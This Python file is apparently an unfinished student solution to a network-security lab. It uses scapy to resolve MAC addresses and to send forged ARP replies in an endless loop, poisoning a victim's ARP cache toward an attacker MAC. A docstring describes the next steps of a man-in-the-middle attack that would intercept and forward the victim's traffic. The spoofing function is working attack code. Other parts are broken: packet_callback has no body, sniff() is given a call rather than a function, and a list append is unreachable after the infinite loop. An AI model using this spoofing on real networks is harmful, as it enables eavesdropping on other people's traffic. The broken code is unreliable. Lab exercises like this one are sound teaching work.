import scapy
import pcapy 
import netifaces
import threading 
import time 
import binascii
import subprocess
from time import sleep
from scapy.all import ARP, send, Ether, srp, sendp, sniff

hackedMachines = []

# ***** Notes on packet listening using pcapy *****
# -------- replace device to interface of choice -----------
# devs = pcapy.findalldevs()
# print(devs)

'''
cap = pcapy.open_live("enp2s0", 65536, 1, 0)
while True: 
	(header, payload) = cap.next() 
	capture_length = header.getlen()
	timestamp = header.getts()
	
	print(f"\nPacket captured at {timestamp[0]}.{timestamp[1]:06d}")
	print(f"\nCaptured Length: {capture_length} bytes")
	print(f"Packet Data (hex): {payload}")
'''



"""
Get the MAC address of a device on the local network given its IP address.
Args:
    ip (str): The IP address of the target device.
Returns:
    str: The MAC address of the target device.
"""

# ************** PART 1 ***************
def getMacAddress(ip)->str:
	target_mac = "ff:ff:ff:ff:ff:ff"
	ether = Ether(dst=target_mac)
	arp = ARP(pdst=ip)
	
	packet = ether/arp
	
	result = srp(packet, timeout=3, verbose=True )[0]
	
	# hi = result
	# print(hi[0])
	
	# received.psrc: The source IP address in the received ARP reply (the device that replied).
	# received.hwsrc: The source MAC address in the received ARP reply (the MAC address of the device that replied).
	# sent: This contains the ARP request packet itself, and you can also access fields like 
	# sent.src (the source MAC address in the ARP request).
	
	for sent, received in result:
        	#print(f"IP: {received.psrc} - MAC: {received.hwsrc}")
        	return received.hwsrc
	pass

"""
Get the IP address of the current machine from the available network interfaces.
Returns:
    str: The selected IP address of the current machine.
"""

def getOwnIpAddress() -> str:
	ip = []
	result = subprocess.run(["ifconfig"], capture_output=True, text=True) # install net tools or use ip a might need net tools for both commands
	results = str(result).replace("\\n", "\n").split("\n")
	for line in results: 
		if "inet" in line and "inet6" not in line:
			words = line.strip().split(" ")

			for i, word in enumerate(words): 

				if word == "inet":
					ip.append( words[i + 1] )
	if "127.0.0.1" in ip: 
		ip.remove("127.0.0.1")
	return ip
	
	
	
# ***************** PART 2 *******************
	"""
Sends an ARP spoofing packet to the target IP address, making it believe that the spoof IP address is associated with the attacker's MAC address.
Args:
    targetIp (str): The IP address of the target machine to be spoofed.
    spoofIp (str): The IP address that the target machine should believe is associated with the attacker's MAC address.
Returns:
    None
Raises:
    Exception: If there is an error in sending the ARP packet.
Example:
    spoof("192.168.1.5", "192.168.1.1")
"""

# send by default is a layer3 config meaning eveyr layer below layer 3 are automatically configured, ethernet wraps layer3 and everything above 
# Thus sendp by default is layer2 config meaning every layer below is automcatically configured thus every layer above needs to be configured
def spoof(targetIp, spoofIp):

	victim_mac = getMacAddress(targetIp)
	gateway_mac = getMacAddress(spoofIp) # Can replace with a legitmate device to seem more believable, will use my own
	attacker_mac = "00:0c:29:b3:5a:ce"
	print("Victim Mac: " + victim_mac + "\nVictim IP: " + targetIp)
	print("Attacker Mac: " + attacker_mac + "\nSpoofed IP: " + spoofIp )
	ether = Ether(dst=victim_mac, src=attacker_mac)
	ether.show()
	arp = ARP(op=2, pdst=targetIp, psrc=spoofIp, hwdst=victim_mac, hwsrc=attacker_mac )
	arp.show()
	
	packet = ether / arp
	while True:
		sendp(packet)
		sleep(5)
	hackedMachines.append([targetIp, victim_mac])
	
	return None
'''
In this step, you will implement full routing to intercept and forward network traffic. This is the most challenging part of the lab. 
You will use the scapy library to sniff all network traffic and identify which traffic is destined for one of the target addresses in the hackedMachines list.
To achieve this, you will:

Use scapy to capture all network packets.

Inspect each packet to determine if it is intended for one of the target addresses in the hackedMachines list.
Forward the intercepted packets to the appropriate destination.

By doing this, you will be able to fully intercept and manipulate the network traffic intended for the target devices.
Here are the steps to follow:

Initialize a packet sniffer.

For each captured packet, check if the destination IP address matches any of the target addresses in the hackedMachines list.

If a match is found, forward the packet to the intended destination.

This will allow you to perform a man-in-the-middle attack,
'''

"""
Starts the packet sniffer to capture network packets.
This function initiates the sniffing process
It captures packets and processes them to forward packets to the intended destination if it's one of the hacked machines.
Returns: None
"""

def packet_callback(pkt):


def startSniffer():
	print("yo")
	pkts = sniff( prn=packet_callback() )
	pass
    
    

if __name__ == "__main__": 
	print("Mac Address for IP: 10.0.0.5 is: " + getMacAddress('10.0.0.5'))
	print("Machine Ip address: "+ getOwnIpAddress()[0] )
	startSniffer()
	print(spoof('10.0.0.5', '10.0.0.1'))
	